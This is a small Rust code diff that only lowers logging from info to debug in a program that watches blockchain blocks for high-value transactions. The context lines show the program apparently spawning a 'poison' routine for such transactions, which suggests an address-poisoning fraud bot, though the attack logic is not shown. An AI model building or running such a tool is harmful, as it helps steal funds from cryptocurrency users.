@@ -7,7 +7,7 @@ use alloy::primitives::U256;
 use alloy::providers::Provider;
 use alloy::signers::local::PrivateKeySigner;
 use futures_util::StreamExt;
-use log::info;
+use log::debug;
 use rocksdb::DB;
 use std::ops::Mul;
 use std::str::FromStr;
@@ -42,11 +42,11 @@ async fn main() {
 
     while let Some(block) = stream.next().await {
         let block = block.unwrap();
-        info!("new block received | number {}", block.number());
+        debug!("new block received | number {}", block.number());
 
         for transaction in block.into_transactions_iter() {
             if transaction.value() > target_value {
-                info!("new transaction received | hash {}", transaction.tx_hash());
+                debug!("new transaction received | hash {}", transaction.tx_hash());
 
                 if config.target.from {
                     tokio::spawn(poison(
